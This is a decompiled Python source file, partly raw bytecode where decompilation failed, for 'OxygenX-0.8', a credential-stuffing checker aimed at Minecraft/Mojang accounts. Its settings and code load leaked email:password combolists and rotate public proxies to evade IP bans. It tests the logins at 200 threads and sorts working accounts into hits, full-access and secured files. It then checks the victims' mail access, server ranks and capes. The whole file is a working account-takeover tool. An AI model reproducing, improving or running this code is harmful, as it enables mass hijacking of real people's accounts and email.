# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: OxygenX-0.8.py
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
import multiprocessing.dummy as ThreadPool
from os import mkdir, path, system, name
from random import choice
from re import compile
from threading import Thread, Lock
from time import sleep, strftime, time, gmtime
from traceback import format_exc
from cloudscraper import create_scraper
from colorama import init, Fore
from console.utils import set_title
from easygui import fileopenbox
from requests import Session, exceptions
from yaml import safe_load
default_values = '#       ________                                     ____  ___\n#       \\_____  \\ ___  ______.__. ____   ____   ____ \\   \\/  /\n#        /   |   \\\\  \\/  <   |  |/ ___\\_/ __ \\ /    \\ \\     /\n#       /    |    \\>    < \\___  / /_/  >  ___/|   |  \\/     \\\n#       \\_______  /__/\\_ \\/ ____\\___  / \\___  >___|  /___/\\  \\\n#               \\/      \\/\\/   /_____/      \\/     \\/      \\_/\n#\n#                   -Created and coded by ShadowOxygen\n#                   -Code cleaned and revised by MohanadHosny#9152\n#                   -Settings file for OxygenX-0.8\n\nOxygenX:\n\n  # Check if current version of OxygenX is latest\n  check_for_updates: true\n\n  # Amount of checks for a account many times to check a account. will be slower if retries is set higher\n  # Needs to be 1 or higher (Recommanded: 1-2 for paid proxies, 3-6 for public proxies.)\n  retries: 3\n\n  # Higher for better accuracy but slower (counted in milliseconds, example: 6000ms = 6 seconds)\n  timeout: 6000\n\n  # Threads for account checking\n  threads: 200\n  \n  # Remove all duplicates in combolist\n  combo_duplicates: true\n  \n  # Remove all duplicates in proxylist/api\n  proxy_duplicates: true\n  \n  # Check hits if its a mail access\n  mail_access: true\n  \n  # Save ranked accounts in NFA.txt or SFA.txt (Turn it off for ranked accounts NOT to save in NFA.txt or SFA.txt)\n  save_ranked_type: true\n  \n  # Print bad accounts\n  print_bad: true\n  \n  # Save bad accounts\n  save_bad: true\n\n  # Normal users should keep this false unless problem start happening\n  debugging: false\n  \n  \n  capes:\n    # Check capes\n    liquidbounce: true\n    optifine: true\n    labymod:  true\n    mojang:  true\n\n  rank:\n  # Set true if you want to check the ranks/level\n    mineplex: true\n    hypixel:  true\n    hivemc: true\n    veltpvp: true\n\n  level:\n    # Save High leveled accounts in files.\n    hypixel: true\n    mineplex: true\n    \n    # Minimum high level accounts\n    hypixel_level: 25\n    mineplex_level: 25\n\n  proxy:\n    # If proxies should be used, Will be proxyless if set to false (Recommended to use VPN if this is set to false.)\n    proxy: true\n    # Proxy types: https | socks4 | socks5\n    proxy_type: \'socks4\'\n    # EXPERMENTAL! Still in testing stage, may have problems\n    # Locks the proxy so other threads can\'t use it\n    lock_proxy: false\n    # EXPERMENTAL! Still in testing stage, may have problems\n    # Auto remove proxies (you can limit the proxies removed with proxy_remove_limit)\n    remove_bad_proxy: false\n    # EXPERMENTAL! Still in testing stage, may have problems\n    # If remove bad proxies are on, once the proxy list hits the limit it will stop removing bad proxies\n    proxy_remove_limit: 2000\n    # If proxies be used for checking sfas (Will be slower but if false, you may get ip banned)\n    proxy_for_sfa: false\n    # Sleep between checks if proxy mode is false (put 0 for no sleep) counted in secouds\n    sleep_proxyless: 30\n    \n    api:\n      # If proxy api link to be used.\n      use: false\n      # If proxy_use_api is true, put api link in the parentheses\n      api_link: "https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=3000"\n      # If proxy_use_api is true, put a number for seconds to refresh the link (every number under 30 is for no refreshing time, recommend refresh time: 300 seconds aka 5 minutes)\n      refresh_time: 300\n'
if path.exists('Settings.yml'):
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))
else:
    open('Settings.yml', 'w').write(default_values)
    settings = safe_load(open('Settings.yml', 'r', errors='ignore'))

class Counter:
    nfa = 0
    error = 0
    sfa = 0
    unfa = 0
    demo = 0
    hits = 0
    bad = 0
    optifine = 0
    mojang = 0
    labymod = 0
    liquidbounce = 0
    special_name = 0
    hivemcrank = 0
    mineplexrank = 0
    mineplexhl = 0
    hypixelrank = 0
    hypixelhl = 0
    hivelevel = 0
    mfa = 0
    nohypixel = 0
    nomineplex = 0
    veltrank = 0
    checked = 0
    cpm = 0
    legacy_name = 0


class Main:

    def __init__(self):
        self.stop_time = True
        self.announcement = ''
        self.start_time = 0
        self.accounts = []
        self.proxylist = []
        self.folder = ''
        self.unmigrated = False
        if OxygenX.Cape.lb:
            self.lbcape = str(self.liquidbounce())
        else:
            print(t)
            print(f"{red}[!] Please remember to configure your settings file before using OxygenX\n")
            print(f"{cyan}[Mode] Choose checker mode\n[>] 1 for Normal Mode\n[>] 2 for Unmigrated Mode")
            mode = input('> ')
            if mode == '2':
                self.unmigrated = True
            else:
                print('\nSelected Normal Mode')
        self.loadcombo()
        self.loadproxy()
        self.resultfolder()
        print(f"\n{cyan}Starting Threads...")
        Thread(target=(self.cpm_counter), daemon=True).start()
        self.start_checker()
        print(f"[{red}Exit{white}] You can now close OxygenX...\n")
        input()
        exit()

    def prep--- This code section failed: ---

 L. 185         0  LOAD_STR                 ':'
                2  LOAD_FAST                'line'
                4  COMPARE_OP               in
              6_8  POP_JUMP_IF_FALSE  2102  'to 2102'

 L. 186     10_12  SETUP_FINALLY      2018  'to 2018'

 L. 187        14  LOAD_FAST                'line'
               16  LOAD_METHOD              split
               18  LOAD_STR                 ':'
               20  LOAD_CONST               1
               22  CALL_METHOD_2         2  ''
               24  UNPACK_SEQUENCE_2     2 
               26  STORE_DEREF              'email'
               28  STORE_FAST               'password'

 L. 188        30  LOAD_FAST                'line'
               32  STORE_FAST               'original_line'

 L. 189        34  LOAD_DEREF               'email'
               36  STORE_FAST               'original_email'

 L. 190        38  LOAD_FAST                'self'
               40  LOAD_ATTR                unmigrated
            42_44  POP_JUMP_IF_FALSE   312  'to 312'

 L. 191        46  LOAD_STR                 '@'
               48  LOAD_DEREF               'email'
               50  COMPARE_OP               in
            52_54  POP_JUMP_IF_FALSE   312  'to 312'

 L. 192        56  LOAD_DEREF               'email'
               58  LOAD_METHOD              split
               60  LOAD_STR                 '@'
               62  CALL_METHOD_1         1  ''
               64  LOAD_CONST               0
               66  BINARY_SUBSCR    
               68  STORE_DEREF              'email'

 L. 193        70  LOAD_GLOBAL              any
               72  LOAD_CLOSURE             'email'
               74  BUILD_TUPLE_1         1 
               76  LOAD_GENEXPR             '<code_object <genexpr>>'
               78  LOAD_STR                 'Main.prep.<locals>.<genexpr>'
               80  MAKE_FUNCTION_8          'closure'
               82  LOAD_GLOBAL              charz
               84  GET_ITER         
               86  CALL_FUNCTION_1       1  ''
               88  CALL_FUNCTION_1       1  ''
               90  POP_JUMP_IF_TRUE    108  'to 108'

 L. 194        92  LOAD_DEREF               'email'
               94  FORMAT_VALUE          0  ''
               96  LOAD_STR                 ':'
               98  LOAD_FAST                'password'
              100  FORMAT_VALUE          0  ''
              102  BUILD_STRING_3        3 
              104  STORE_FAST               'line'
              106  JUMP_FORWARD        186  'to 186'
            108_0  COME_FROM            90  '90'

 L. 196       108  LOAD_GLOBAL              Counter
              110  DUP_TOP          
              112  LOAD_ATTR                checked
              114  LOAD_CONST               1
              116  INPLACE_ADD      
              118  ROT_TWO          
              120  STORE_ATTR               checked

 L. 197       122  LOAD_GLOBAL              Counter
              124  DUP_TOP          
              126  LOAD_ATTR                bad
              128  LOAD_CONST               1
              130  INPLACE_ADD      
              132  ROT_TWO          
              134  STORE_ATTR               bad

 L. 198       136  LOAD_FAST                'self'
              138  LOAD_METHOD              prints
              140  LOAD_GLOBAL              red
              142  FORMAT_VALUE          0  ''
              144  LOAD_STR                 '[Badline] '
              146  LOAD_GLOBAL              blue
              148  FORMAT_VALUE          0  ''
              150  LOAD_STR                 '- '
              152  LOAD_GLOBAL              red
              154  FORMAT_VALUE          0  ''
              156  LOAD_FAST                'line'
              158  FORMAT_VALUE          0  ''
              160  BUILD_STRING_6        6 
              162  CALL_METHOD_1         1  ''
              164  POP_TOP          

 L. 199       166  LOAD_FAST                'self'
              168  LOAD_METHOD              writing
              170  LOAD_FAST                'line'
              172  LOAD_STR                 'Badline'
              174  BUILD_LIST_2          2 
              176  CALL_METHOD_1         1  ''
              178  POP_TOP          

 L. 200       180  POP_BLOCK        
              182  LOAD_CONST               None
              184  RETURN_VALUE     
            186_0  COME_FROM           106  '106'

 L. 201       186  LOAD_FAST                'self'
              188  LOAD_METHOD              checkname
              190  LOAD_DEREF               'email'
              192  CALL_METHOD_1         1  ''
              194  STORE_FAST               'reply'

 L. 202       196  LOAD_FAST                'reply'
          198_200  POP_JUMP_IF_TRUE    296  'to 296'

 L. 203       202  LOAD_GLOBAL              Counter
              204  DUP_TOP          
              206  LOAD_ATTR                checked
              208  LOAD_CONST               1
              210  INPLACE_ADD      
              212  ROT_TWO          
              214  STORE_ATTR               checked

 L. 204       216  LOAD_GLOBAL              Counter
              218  DUP_TOP          
              220  LOAD_ATTR                bad
              222  LOAD_CONST               1
              224  INPLACE_ADD      
              226  ROT_TWO          
              228  STORE_ATTR               bad

 L. 205       230  LOAD_GLOBAL              OxygenX
              232  LOAD_ATTR                print_bad
          234_236  POP_JUMP_IF_FALSE   268  'to 268'

 L. 206       238  LOAD_FAST                'self'
              240  LOAD_METHOD              prints
              242  LOAD_GLOBAL              red
              244  FORMAT_VALUE          0  ''
              246  LOAD_STR                 '[Bad] '
              248  LOAD_GLOBAL              blue
              250  FORMAT_VALUE          0  ''
              252  LOAD_STR                 '- '
              254  LOAD_GLOBAL              red
              256  FORMAT_VALUE          0  ''
              258  LOAD_FAST                'line'
              260  FORMAT_VALUE          0  ''
              262  BUILD_STRING_6        6 
              264  CALL_METHOD_1         1  ''
              266  POP_TOP          
            268_0  COME_FROM           234  '234'

 L. 207       268  LOAD_GLOBAL              OxygenX
              270  LOAD_ATTR                save_bad
          272_274  POP_JUMP_IF_FALSE   290  'to 290'

 L. 208       276  LOAD_FAST                'self'
              278  LOAD_METHOD              writing
              280  LOAD_FAST                'line'
              282  LOAD_STR                 'Bad'
              284  BUILD_LIST_2          2 
              286  CALL_METHOD_1         1  ''
              288  POP_TOP          
            290_0  COME_FROM           272  '272'

 L. 209       290  POP_BLOCK        
              292  LOAD_CONST               None
              294  RETURN_VALUE     
            296_0  COME_FROM           198  '198'

 L. 211       296  LOAD_GLOBAL              Counter
              298  DUP_TOP          
              300  LOAD_ATTR                legacy_name
              302  LOAD_CONST               1
              304  INPLACE_ADD      
              306  ROT_TWO          
              308  STORE_ATTR               legacy_name
              310  JUMP_FORWARD        312  'to 312'
            312_0  COME_FROM           310  '310'
            312_1  COME_FROM            52  '52'
            312_2  COME_FROM            42  '42'

 L. 214       312  LOAD_FAST                'self'
              314  LOAD_ATTR                checkmc
              316  LOAD_DEREF               'email'
              318  LOAD_FAST                'password'
              320  LOAD_CONST               ('user', 'passw')
              322  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              324  STORE_FAST               'answer'

 L. 215       326  LOAD_GLOBAL              Counter
              328  DUP_TOP          
              330  LOAD_ATTR                checked
              332  LOAD_CONST               1
              334  INPLACE_ADD      
              336  ROT_TWO          
              338  STORE_ATTR               checked

 L. 216       340  LOAD_STR                 'Invalid credentials'
              342  LOAD_FAST                'answer'
              344  COMPARE_OP               in
          346_348  POP_JUMP_IF_FALSE   430  'to 430'

 L. 217       350  LOAD_GLOBAL              Counter
              352  DUP_TOP          
              354  LOAD_ATTR                bad
              356  LOAD_CONST               1
              358  INPLACE_ADD      
              360  ROT_TWO          
              362  STORE_ATTR               bad

 L. 218       364  LOAD_GLOBAL              OxygenX
              366  LOAD_ATTR                print_bad
          368_370  POP_JUMP_IF_FALSE   402  'to 402'

 L. 219       372  LOAD_FAST                'self'
              374  LOAD_METHOD              prints
              376  LOAD_GLOBAL              red
              378  FORMAT_VALUE          0  ''
              380  LOAD_STR                 '[Bad] '
              382  LOAD_GLOBAL              blue
              384  FORMAT_VALUE          0  ''
              386  LOAD_STR                 '- '
              388  LOAD_GLOBAL              red
              390  FORMAT_VALUE          0  ''
              392  LOAD_FAST                'line'
              394  FORMAT_VALUE          0  ''
              396  BUILD_STRING_6        6 
              398  CALL_METHOD_1         1  ''
              400  POP_TOP          
            402_0  COME_FROM           368  '368'

 L. 220       402  LOAD_GLOBAL              OxygenX
              404  LOAD_ATTR                save_bad
          406_408  POP_JUMP_IF_FALSE   424  'to 424'

 L. 221       410  LOAD_FAST                'self'
              412  LOAD_METHOD              writing
              414  LOAD_FAST                'line'
              416  LOAD_STR                 'Bad'
              418  BUILD_LIST_2          2 
              420  CALL_METHOD_1         1  ''
              422  POP_TOP          
            424_0  COME_FROM           406  '406'

 L. 222       424  POP_BLOCK        
              426  LOAD_CONST               None
              428  RETURN_VALUE     
            430_0  COME_FROM           346  '346'

 L. 223       430  LOAD_FAST                'answer'
              432  LOAD_ATTR                text
              434  STORE_FAST               'texta'

 L. 224       436  LOAD_STR                 '[]'
              438  LOAD_FAST                'texta'
              440  COMPARE_OP               in
          442_444  POP_JUMP_IF_FALSE   510  'to 510'

 L. 225       446  LOAD_FAST                'self'
              448  LOAD_METHOD              prints
              450  LOAD_GLOBAL              yellow
              452  FORMAT_VALUE          0  ''
              454  LOAD_STR                 '[Demo] '
              456  LOAD_GLOBAL              blue
              458  FORMAT_VALUE          0  ''
              460  LOAD_STR                 '- '
              462  LOAD_GLOBAL              yellow
              464  FORMAT_VALUE          0  ''
              466  LOAD_FAST                'line'
              468  FORMAT_VALUE          0  ''
              470  BUILD_STRING_6        6 
              472  CALL_METHOD_1         1  ''
              474  POP_TOP          

 L. 226       476  LOAD_GLOBAL              Counter
              478  DUP_TOP          
              480  LOAD_ATTR                demo
              482  LOAD_CONST               1
              484  INPLACE_ADD      
              486  ROT_TWO          
              488  STORE_ATTR               demo

 L. 227       490  LOAD_FAST                'self'
              492  LOAD_METHOD              writing
              494  LOAD_FAST                'line'
              496  LOAD_STR                 'Demo'
              498  BUILD_LIST_2          2 
              500  CALL_METHOD_1         1  ''
              502  POP_TOP          

 L. 228       504  POP_BLOCK        
              506  LOAD_CONST               None
              508  RETURN_VALUE     
            510_0  COME_FROM           442  '442'

 L. 230       510  LOAD_FAST                'answer'
              512  LOAD_METHOD              json
              514  CALL_METHOD_0         0  ''
              516  STORE_FAST               'ajson'

 L. 231       518  LOAD_FAST                'ajson'
              520  LOAD_STR                 'availableProfiles'
              522  BINARY_SUBSCR    
              524  LOAD_CONST               0
              526  BINARY_SUBSCR    
              528  LOAD_STR                 'id'
              530  BINARY_SUBSCR    
              532  STORE_FAST               'uuid'

 L. 232       534  LOAD_FAST                'ajson'
              536  LOAD_STR                 'availableProfiles'
              538  BINARY_SUBSCR    
              540  LOAD_CONST               0
              542  BINARY_SUBSCR    
              544  LOAD_STR                 'name'
              546  BINARY_SUBSCR    
              548  STORE_DEREF              'username'

 L. 233       550  LOAD_FAST                'self'
              552  LOAD_METHOD              writing
              554  LOAD_FAST                'line'
              556  LOAD_STR                 'Hits'
              558  BUILD_LIST_2          2 
              560  CALL_METHOD_1         1  ''
              562  POP_TOP          

 L. 234       564  LOAD_FAST                'ajson'
              566  LOAD_STR                 'accessToken'
              568  BINARY_SUBSCR    
              570  STORE_FAST               'token'

 L. 235       572  LOAD_CONST               True
              574  STORE_FAST               'dosfa'

 L. 236       576  LOAD_CONST               False
              578  STORE_FAST               'sfa'

 L. 237       580  LOAD_CONST               True
              582  STORE_FAST               'saveranked'

 L. 238       584  LOAD_FAST                'self'
              586  LOAD_ATTR                unmigrated
          588_590  POP_JUMP_IF_FALSE   636  'to 636'

 L. 239       592  LOAD_STR                 '=======================================\nOriginal Combo: '
              594  LOAD_FAST                'original_line'
              596  FORMAT_VALUE          0  ''
              598  LOAD_STR                 '\nUnmigrated Combo: '
              600  LOAD_FAST                'line'
              602  FORMAT_VALUE          0  ''
              604  LOAD_STR                 '\nUsername: '
              606  LOAD_DEREF               'username'
              608  FORMAT_VALUE          0  ''
              610  LOAD_STR                 '\nUUID: '
              612  LOAD_FAST                'uuid'
              614  FORMAT_VALUE          0  ''
              616  LOAD_STR                 '\nEmail?: '
              618  LOAD_FAST                'original_email'
              620  FORMAT_VALUE          0  ''
              622  LOAD_STR                 '\nPassword: '
              624  LOAD_FAST                'password'
              626  FORMAT_VALUE          0  ''
              628  BUILD_STRING_12      12 
              630  BUILD_LIST_1          1 
              632  STORE_FAST               'data'
              634  JUMP_FORWARD        672  'to 672'
            636_0  COME_FROM           588  '588'

 L. 247       636  LOAD_STR                 '=======================================\nOriginal Combo: '
              638  LOAD_FAST                'line'
              640  FORMAT_VALUE          0  ''
              642  LOAD_STR                 '\nUsername: '
              644  LOAD_DEREF               'username'
              646  FORMAT_VALUE          0  ''
              648  LOAD_STR                 '\nUUID: '
              650  LOAD_FAST                'uuid'
              652  FORMAT_VALUE          0  ''
              654  LOAD_STR                 '\nEmail: '
              656  LOAD_DEREF               'email'
              658  FORMAT_VALUE          0  ''
              660  LOAD_STR                 '\nPassword: '
              662  LOAD_FAST                'password'
              664  FORMAT_VALUE          0  ''
              666  BUILD_STRING_10      10 
              668  BUILD_LIST_1          1 
              670  STORE_FAST               'data'
            672_0  COME_FROM           634  '634'

 L. 254       672  LOAD_STR                 "legacy': True"
              674  LOAD_GLOBAL              str
              676  LOAD_FAST                'ajson'
              678  CALL_FUNCTION_1       1  ''
              680  COMPARE_OP               in
          682_684  POP_JUMP_IF_TRUE    708  'to 708'

 L. 255       686  LOAD_FAST                'self'
              688  LOAD_ATTR                unmigrated

 L. 254   690_692  POP_JUMP_IF_FALSE   780  'to 780'

 L. 255       694  LOAD_STR                 "legacy': True"
              696  LOAD_GLOBAL              str
              698  LOAD_FAST                'ajson'
              700  CALL_FUNCTION_1       1  ''
              702  COMPARE_OP               in

 L. 254   704_706  POP_JUMP_IF_FALSE   780  'to 780'
            708_0  COME_FROM           682  '682'

 L. 256       708  LOAD_GLOBAL              Counter
              710  DUP_TOP          
              712  LOAD_ATTR                unfa
              714  LOAD_CONST               1
              716  INPLACE_ADD      
              718  ROT_TWO          
              720  STORE_ATTR               unfa

 L. 257       722  LOAD_FAST                'self'
              724  LOAD_METHOD              prints
              726  LOAD_GLOBAL              magenta
              728  FORMAT_VALUE          0  ''
              730  LOAD_STR                 '[Unmigrated]'
              732  LOAD_GLOBAL              blue
              734  FORMAT_VALUE          0  ''
              736  LOAD_STR                 ' - '
              738  LOAD_GLOBAL              green
              740  FORMAT_VALUE          0  ''
              742  LOAD_FAST                'line'
              744  FORMAT_VALUE          0  ''
              746  BUILD_STRING_6        6 
              748  CALL_METHOD_1         1  ''
              750  POP_TOP          

 L. 258       752  LOAD_FAST                'self'
              754  LOAD_METHOD              writing
              756  LOAD_FAST                'line'
              758  LOAD_STR                 'Unmigrated'
              760  BUILD_LIST_2          2 
              762  CALL_METHOD_1         1  ''
              764  POP_TOP          

 L. 259       766  LOAD_FAST                'data'
              768  LOAD_METHOD              append
              770  LOAD_STR                 '\nUnmigrated: True'
              772  CALL_METHOD_1         1  ''
              774  POP_TOP          

 L. 260       776  LOAD_CONST               False
              778  STORE_FAST               'dosfa'
            780_0  COME_FROM           704  '704'
            780_1  COME_FROM           690  '690'

 L. 262       780  LOAD_FAST                'dosfa'
          782_784  POP_JUMP_IF_TRUE    794  'to 794'
              786  LOAD_FAST                'self'
              788  LOAD_ATTR                unmigrated
          790_792  POP_JUMP_IF_TRUE    948  'to 948'
            794_0  COME_FROM           782  '782'

 L. 263       794  LOAD_FAST                'self'
              796  LOAD_ATTR                secure_check
              798  LOAD_FAST                'token'
              800  LOAD_CONST               ('token',)
              802  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              804  STORE_FAST               'securec'

 L. 264       806  LOAD_FAST                'securec'
          808_810  POP_JUMP_IF_FALSE   888  'to 888'

 L. 265       812  LOAD_GLOBAL              Counter
              814  DUP_TOP          
              816  LOAD_ATTR                sfa
              818  LOAD_CONST               1
              820  INPLACE_ADD      
              822  ROT_TWO          
              824  STORE_ATTR               sfa

 L. 266       826  LOAD_FAST                'self'
              828  LOAD_METHOD              prints
              830  LOAD_GLOBAL              cyan
              832  FORMAT_VALUE          0  ''
              834  LOAD_STR                 '[SFA]'
              836  LOAD_GLOBAL              blue
              838  FORMAT_VALUE          0  ''
              840  LOAD_STR                 ' - '
              842  LOAD_GLOBAL              green
              844  FORMAT_VALUE          0  ''
              846  LOAD_FAST                'line'
              848  FORMAT_VALUE          0  ''
              850  LOAD_GLOBAL              blue
              852  FORMAT_VALUE          0  ''
              854  LOAD_STR                 ' | '
              856  LOAD_GLOBAL              green
              858  FORMAT_VALUE          0  ''
              860  LOAD_STR                 'Username: '
              862  LOAD_DEREF               'username'
              864  FORMAT_VALUE          0  ''
              866  BUILD_STRING_11      11 
              868  CALL_METHOD_1         1  ''
              870  POP_TOP          

 L. 267       872  LOAD_CONST               True
              874  STORE_FAST               'sfa'

 L. 268       876  LOAD_FAST                'data'
              878  LOAD_METHOD              append
              880  LOAD_STR                 '\nSFA: True'
              882  CALL_METHOD_1         1  ''
              884  POP_TOP          
              886  JUMP_FORWARD        948  'to 948'
            888_0  COME_FROM           808  '808'

 L. 270       888  LOAD_GLOBAL              Counter
              890  DUP_TOP          
              892  LOAD_ATTR                nfa
              894  LOAD_CONST               1
              896  INPLACE_ADD      
              898  ROT_TWO          
              900  STORE_ATTR               nfa

 L. 271       902  LOAD_FAST                'self'
              904  LOAD_METHOD              prints
              906  LOAD_GLOBAL              green
              908  FORMAT_VALUE          0  ''
              910  LOAD_STR                 '[NFA]'
              912  LOAD_GLOBAL              blue
              914  FORMAT_VALUE          0  ''
              916  LOAD_STR                 ' - '
              918  LOAD_GLOBAL              green
              920  FORMAT_VALUE          0  ''
              922  LOAD_FAST                'line'
              924  FORMAT_VALUE          0  ''
              926  LOAD_GLOBAL              blue
              928  FORMAT_VALUE          0  ''
              930  LOAD_STR                 ' | '
              932  LOAD_GLOBAL              green
              934  FORMAT_VALUE          0  ''
              936  LOAD_STR                 'Username: '
              938  LOAD_DEREF               'username'
              940  FORMAT_VALUE          0  ''
              942  BUILD_STRING_11      11 
              944  CALL_METHOD_1         1  ''
              946  POP_TOP          
            948_0  COME_FROM           886  '886'
            948_1  COME_FROM           790  '790'

 L. 272       948  LOAD_GLOBAL              Counter
              950  DUP_TOP          
              952  LOAD_ATTR                hits
              954  LOAD_CONST               1
              956  INPLACE_ADD      
              958  ROT_TWO          
              960  STORE_ATTR               hits

 L. 274       962  LOAD_GLOBAL              len
              964  LOAD_DEREF               'username'
              966  CALL_FUNCTION_1       1  ''
              968  LOAD_CONST               3
              970  COMPARE_OP               <=
          972_974  POP_JUMP_IF_TRUE   1000  'to 1000'
              976  LOAD_GLOBAL              any
              978  LOAD_CLOSURE             'username'
              980  BUILD_TUPLE_1         1 
              982  LOAD_GENEXPR             '<code_object <genexpr>>'
              984  LOAD_STR                 'Main.prep.<locals>.<genexpr>'
              986  MAKE_FUNCTION_8          'closure'
              988  LOAD_GLOBAL              charz
              990  GET_ITER         
              992  CALL_FUNCTION_1       1  ''
              994  CALL_FUNCTION_1       1  ''
          996_998  POP_JUMP_IF_FALSE  1048  'to 1048'
           1000_0  COME_FROM           972  '972'

 L. 275      1000  LOAD_GLOBAL              Counter
             1002  DUP_TOP          
             1004  LOAD_ATTR                special_name
             1006  LOAD_CONST               1
             1008  INPLACE_ADD      
             1010  ROT_TWO          
             1012  STORE_ATTR               special_name

 L. 276      1014  LOAD_FAST                'self'
             1016  LOAD_METHOD              writing
             1018  LOAD_FAST                'line'
             1020  FORMAT_VALUE          0  ''
             1022  LOAD_STR                 ' | Username: '
             1024  LOAD_DEREF               'username'
             1026  FORMAT_VALUE          0  ''
             1028  BUILD_STRING_3        3 
             1030  LOAD_STR                 'SpecialName'
             1032  BUILD_LIST_2          2 
             1034  CALL_METHOD_1         1  ''
             1036  POP_TOP          

 L. 277      1038  LOAD_FAST                'data'
             1040  LOAD_METHOD              append
             1042  LOAD_STR                 '\nSpecial Name: True'
             1044  CALL_METHOD_1         1  ''
             1046  POP_TOP          
           1048_0  COME_FROM           996  '996'

 L. 279      1048  LOAD_GLOBAL              ThreadPoolExecutor
             1050  LOAD_CONST               9
             1052  LOAD_CONST               ('max_workers',)
             1054  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
             1056  SETUP_WITH         1244  'to 1244'
             1058  STORE_FAST               'exe'

 L. 280      1060  LOAD_FAST                'exe'
             1062  LOAD_METHOD              submit
             1064  LOAD_FAST                'self'
             1066  LOAD_ATTR                hypixel
             1068  LOAD_FAST                'uuid'
             1070  LOAD_FAST                'line'
             1072  CALL_METHOD_3         3  ''
             1074  LOAD_METHOD              result
             1076  CALL_METHOD_0         0  ''
             1078  STORE_FAST               'hypixel'

 L. 281      1080  LOAD_FAST                'exe'
             1082  LOAD_METHOD              submit
             1084  LOAD_FAST                'self'
             1086  LOAD_ATTR                mineplex
             1088  LOAD_DEREF               'username'
             1090  LOAD_FAST                'line'
             1092  CALL_METHOD_3         3  ''
             1094  LOAD_METHOD              result
             1096  CALL_METHOD_0         0  ''
             1098  STORE_FAST               'mineplex'

 L. 282      1100  LOAD_FAST                'exe'
             1102  LOAD_METHOD              submit
             1104  LOAD_FAST                'self'
             1106  LOAD_ATTR                hivemc
             1108  LOAD_FAST                'uuid'
             1110  LOAD_FAST                'line'
             1112  CALL_METHOD_3         3  ''
             1114  LOAD_METHOD              result
             1116  CALL_METHOD_0         0  ''
             1118  STORE_FAST               'hiverank'

 L. 283      1120  LOAD_FAST                'exe'
             1122  LOAD_METHOD              submit
             1124  LOAD_FAST                'self'
             1126  LOAD_ATTR                mailaccess
             1128  LOAD_FAST                'original_line'
             1130  CALL_METHOD_2         2  ''
             1132  LOAD_METHOD              result
             1134  CALL_METHOD_0         0  ''
             1136  STORE_FAST               'mailaccess'

 L. 284      1138  LOAD_FAST                'exe'
             1140  LOAD_METHOD              submit
             1142  LOAD_FAST                'self'
             1144  LOAD_ATTR                veltpvp
             1146  LOAD_DEREF               'username'
             1148  LOAD_FAST                'line'
             1150  CALL_METHOD_3         3  ''
             1152  LOAD_METHOD              result
             1154  CALL_METHOD_0         0  ''
             1156  STORE_FAST               'veltrank'

 L. 285      1158  LOAD_FAST                'exe'
             1160  LOAD_METHOD              submit
             1162  LOAD_FAST                'self'
             1164  LOAD_ATTR                mojang
             1166  LOAD_FAST                'uuid'
             1168  LOAD_FAST                'line'
             1170  LOAD_DEREF               'username'
             1172  CALL_METHOD_4         4  ''
             1174  LOAD_METHOD              result
             1176  CALL_METHOD_0         0  ''
             1178  STORE_FAST               'mojang'

 L. 286      1180  LOAD_FAST                'exe'
             1182  LOAD_METHOD              submit
             1184  LOAD_FAST                'self'
             1186  LOAD_ATTR                optifine
             1188  LOAD_DEREF               'username'
             1190  LOAD_FAST                'line'
             1192  CALL_METHOD_3         3  ''
             1194  LOAD_METHOD              result
             1196  CALL_METHOD_0         0  ''
             1198  STORE_FAST               'optifine'

 L. 287      1200  LOAD_FAST                'exe'
             1202  LOAD_METHOD              submit
             1204  LOAD_FAST                'self'
             1206  LOAD_ATTR                labymod
             1208  LOAD_FAST                'uuid'
             1210  LOAD_FAST                'line'
             1212  LOAD_DEREF               'username'
             1214  CALL_METHOD_4         4  ''
             1216  LOAD_METHOD              result
             1218  CALL_METHOD_0         0  ''
             1220  STORE_FAST               'labycape'

 L. 288      1222  LOAD_FAST                'exe'
             1224  LOAD_METHOD              submit
             1226  LOAD_FAST                'self'
             1228  LOAD_ATTR                skyblock
             1230  LOAD_FAST                'uuid'
             1232  CALL_METHOD_2         2  ''
             1234  LOAD_METHOD              result
             1236  CALL_METHOD_0         0  ''
             1238  STORE_FAST               'skyblock'
             1240  POP_BLOCK        
             1242  BEGIN_FINALLY    
           1244_0  COME_FROM_WITH     1056  '1056'
             1244  WITH_CLEANUP_START
             1246  WITH_CLEANUP_FINISH
             1248  END_FINALLY      

 L. 289  1250_1252  SETUP_FINALLY      1888  'to 1888'

 L. 290      1254  LOAD_FAST                'mojang'
         1256_1258  POP_JUMP_IF_FALSE  1270  'to 1270'

 L. 291      1260  LOAD_FAST                'data'
             1262  LOAD_METHOD              append
             1264  LOAD_STR                 '\nMojang Cape: True'
             1266  CALL_METHOD_1         1  ''
             1268  POP_TOP          
           1270_0  COME_FROM          1256  '1256'

 L. 293      1270  LOAD_FAST                'optifine'
         1272_1274  POP_JUMP_IF_FALSE  1286  'to 1286'

 L. 294      1276  LOAD_FAST                'data'
             1278  LOAD_METHOD              append
             1280  LOAD_STR                 '\nOptifine Cape: True'
             1282  CALL_METHOD_1         1  ''
             1284  POP_TOP          
           1286_0  COME_FROM          1272  '1272'

 L. 296      1286  LOAD_FAST                'labycape'
         1288_1290  POP_JUMP_IF_FALSE  1302  'to 1302'

 L. 297      1292  LOAD_FAST                'data'
             1294  LOAD_METHOD              append
             1296  LOAD_STR                 '\nLabymod Cape: True'
             1298  CALL_METHOD_1         1  ''
             1300  POP_TOP          
           1302_0  COME_FROM          1288  '1288'

 L. 299      1302  LOAD_GLOBAL              OxygenX
             1304  LOAD_ATTR                Cape
             1306  LOAD_ATTR                lb
         1308_1310  POP_JUMP_IF_FALSE  1372  'to 1372'

 L. 300      1312  LOAD_FAST                'uuid'
             1314  LOAD_FAST                'self'
             1316  LOAD_ATTR                lbcape
             1318  COMPARE_OP               in
         1320_1322  POP_JUMP_IF_FALSE  1372  'to 1372'

 L. 301      1324  LOAD_GLOBAL              Counter
             1326  DUP_TOP          
             1328  LOAD_ATTR                liquidbounce
             1330  LOAD_CONST               1
             1332  INPLACE_ADD      
             1334  ROT_TWO          
             1336  STORE_ATTR               liquidbounce

